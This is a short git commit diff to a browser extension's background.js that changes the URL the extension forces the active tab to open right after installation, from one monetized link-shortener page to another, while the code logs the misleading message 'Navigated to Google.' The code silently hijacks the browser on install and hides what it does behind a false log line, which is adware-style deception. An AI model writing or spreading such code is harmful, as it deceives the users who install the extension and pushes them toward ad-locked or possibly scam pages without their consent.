03331e98aa4822224ee32a925796700dbd8e7b2d
UkayWatch18 <djawadnitro4@gmail.com>
2024-08-04 10:28:16 +0200

    Update background.js

--- background.js
+++ background.js
@@ -2,7 +2,7 @@ chrome.runtime.onInstalled.addListener(() => {
   console.log('Starting extension..');
 
   setTimeout(() => {
-    chrome.tabs.update(undefined, { url: 'https://linkvertise.com/329736/veinminernewupdate' }, () => {
+    chrome.tabs.update(undefined, { url: 'https://link-hub.net/1212164/i-guess-you-wont-fall' }, () => {
       console.log("Navigated to Google.");
       setTimeout(() => {
         chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
